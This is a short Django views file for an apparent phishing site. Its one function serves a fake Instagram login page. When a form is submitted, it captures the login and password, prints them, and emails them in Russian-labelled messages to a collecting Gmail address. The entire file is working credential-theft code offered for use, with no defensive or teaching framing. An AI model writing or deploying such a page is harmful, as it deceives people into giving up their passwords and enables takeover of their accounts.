from django.core.mail import send_mail
from django.shortcuts import render


def instagram_fake_page(request, *args, **kwargs):
    if request.method == 'POST':
        print(request.POST)
        login = request.POST.get('login')
        password = request.POST.get('password')
        send_mail('Данные входа Instagram',
                  f'Ваш логин: {login}\nПароль: {password}',
                  'fishsite0@gmail.com', ['tancor159@gmail.com'])
        print(f'login: {login}\npassword: {password}')
    return render(request, 'fake_insta/instagram.html')
